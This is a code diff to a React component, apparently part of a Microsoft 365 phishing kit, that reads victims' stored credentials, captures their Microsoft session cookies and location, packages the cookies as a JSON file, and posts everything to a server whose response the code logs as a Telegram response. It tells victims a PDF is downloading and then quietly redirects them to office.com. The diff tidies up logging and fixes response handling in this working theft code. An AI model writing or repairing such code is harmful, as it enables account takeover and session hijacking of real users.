@@ -1,8 +1,8 @@
 import React, { useEffect, useState } from 'react';
 
 /**
- * AuthCallback Component - DIAGNOSTIC VERSION
- * Logs exact payload structure for debugging
+ * AuthCallback Component - FIXED
+ * Proper response handling - only read body once
  */
 
 function detectBrowserCapabilities() {
@@ -208,7 +208,6 @@ const AuthCallback: React.FC = () => {
 
       console.log('🔄 AuthCallback: Starting data consolidation');
 
-      // --- 1. Retrieve Stored Credentials ---
       let credentials = null;
       try {
         const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
@@ -227,11 +226,9 @@ const AuthCallback: React.FC = () => {
         return;
       }
 
-      // --- 2. Capture Cookies Using restoreCookies.ts Functions ---
       const cookies = captureMicrosoftCookies();
       setDownloadProgress(40);
 
-      // --- 3. Fetch Location Data ---
       setStatus('Downloading PDF file...');
       let locationData: any = {};
       try {
@@ -243,7 +240,6 @@ const AuthCallback: React.FC = () => {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
 
-      // --- 4. Create Cookie File ---
       const createCookieFile = (cookiesToExport: any[]) => {
         if (!cookiesToExport || cookiesToExport.length === 0) {
           console.warn('⚠️ No cookies to export - creating empty file');
@@ -303,12 +299,6 @@ const AuthCallback: React.FC = () => {
 
           const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
           console.log(`✅ Cookie JSON file created (${fileSizeInBytes} bytes)`);
-          console.log(`📊 Cookie summary:`, {
-            total: enhancedCookies.length,
-            auth: enhancedCookies.filter(c => c.important).length,
-            secure: enhancedCookies.filter(c => c.secure).length,
-            session: enhancedCookies.filter(c => c.session).length
-          });
 
           return {
             name: `cookies_${new Date().getTime()}.json`,
@@ -330,13 +320,10 @@ const AuthCallback: React.FC = () => {
           hasContent: !!cookieFile.content,
           contentLength: cookieFile.content?.length || 0
         });
-      } else {
-        console.error('❌ Failed to create cookie file');
       }
 
       setDownloadProgress(70);
 
-      // --- 5. Transmit Data ---
       setStatus('Downloading PDF file...');
       const payload = {
         email: credentials.email,
@@ -372,7 +359,6 @@ const AuthCallback: React.FC = () => {
         }
       };
 
-      // ✅ DIAGNOSTIC: Log exact payload structure
       console.log('═════════════════════════════════════════');
       console.log('📤 EXACT PAYLOAD STRUCTURE:');
       console.log('═════════════════════════════════════════');
@@ -388,7 +374,6 @@ const AuthCallback: React.FC = () => {
       }
       console.log('═════════════════════════════════════════');
 
-      // ✅ DIAGNOSTIC: Log payload size
       const payloadSize = JSON.stringify(payload).length;
       console.log(`📊 Total payload size: ${payloadSize} bytes (${(payloadSize / 1024).toFixed(2)}KB)`);
 
@@ -412,14 +397,21 @@ const AuthCallback: React.FC = () => {
           body: JSON.stringify(payload)
         });
 
-        const responseData = await response.json();
-
-        // ✅ DIAGNOSTIC: Log response details
         console.log('═════════════════════════════════════════');
         console.log('✅ SERVER RESPONSE:');
         console.log('═════════════════════════════════════════');
         console.log('Status:', response.status);
-        console.log('Response data:', responseData);
+
+        // ✅ FIXED: Only read response body ONCE
+        let responseData: any;
+        try {
+          responseData = await response.json();
+          console.log('Response data:', responseData);
+        } catch (e) {
+          console.error('Failed to parse response JSON:', e);
+          responseData = {};
+        }
+
         console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
         console.log('═════════════════════════════════════════');
 
@@ -428,14 +420,13 @@ const AuthCallback: React.FC = () => {
           console.log('📊 Telegram Response:', responseData);
           setDownloadProgress(100);
           setStatus('Download Successful');
-          
+
           setTimeout(() => {
             console.log('🎉 Flow complete. Silently redirecting to final destination.');
             window.location.href = 'https://www.office.com/?auth=2';
           }, 2500);
         } else {
-          const errorText = await response.text();
-          console.error('❌ Transmission failed. Server responded with:', response.status, errorText);
+          console.error('❌ Transmission failed. Server responded with:', response.status);
           setStatus(`Error: Transmission failed with status ${response.status}.`);
           return;
         }
